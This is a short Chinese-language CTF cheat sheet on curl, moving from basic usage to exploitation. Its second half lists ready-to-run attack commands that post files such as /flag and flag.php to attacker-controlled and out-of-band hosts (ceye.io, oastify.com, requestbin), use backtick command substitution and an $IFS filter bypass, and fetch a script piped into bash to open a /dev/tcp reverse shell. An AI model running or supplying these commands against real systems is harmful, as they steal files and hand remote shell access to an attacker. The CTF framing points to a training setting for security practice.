curl发起请求
```
curl mycurl.2qytvx.ceye.io

发起请求
用法：
curl -O index.txt    下载文件保存为index.txt
curl "http://xxx.xx" -O index.dat    下载二进制文件保存为index.dat
curl -X POST           post请求

curl -d "param1=value1&param2=value2" http://example.com/resource

curl -H "xx=xx"       设置请求头
```


## **CTF利用**

curl文件读取，传递文件
```
curl http://vps:7015 -d @/flag


curl -X POST -F xx=@flag.php  http://ie06j1rcl08qz5vd887cz1c9f0ls9ix7.oastify.com


-d选项告诉`curl`要发送一个POST请求，并且指定了要发送的数据。`@`符号后面跟着的是一个文件路径，`/flag`表示要发送的数据位于当前目录下的`flag`文件中。`curl`会读取这个文件的内容，并将其作为POST请求的数据发送到服务器。
-F 带文件`-d @/flag`
```
无法使用/和%，靠curl自身功能命令即可。
通过 HTTP PUT 方法上传文件
```
curl -T flag.php -a 192.168.0.1/flag.php
curl -T flag.php 192.168.0.1/flag.php
curl$IFS-T flag.php 192.168.0.1/flag.php
nc监听80即可
```



读flag
```
curl -X POST http://ip.port.xxxxxx.ceye.io/`whoami`
会先执行whoami,再ping,curl
curl http://5lrtqoyzsnfd6s20fvez6ojwmnsfg94y.oastify.com/`cat flag.php|grep ctfshow`


curl oastify.com/`cat flag.php|grep ctfshow`
curl  -d `cat flag.php|grep ctfshow`  2qytvx.ceye.io
curl -X POST -d "flag=`cat fl0g.php`" http://requestbin.net/r/1et3jvl1
```


curl反弹shell
```
curl http://47.109.58.205/fanshell.txt|bash
fanshell.txt内容为：bash -i >& /dev/tcp/47.109.58.205/2333 0>&1
```

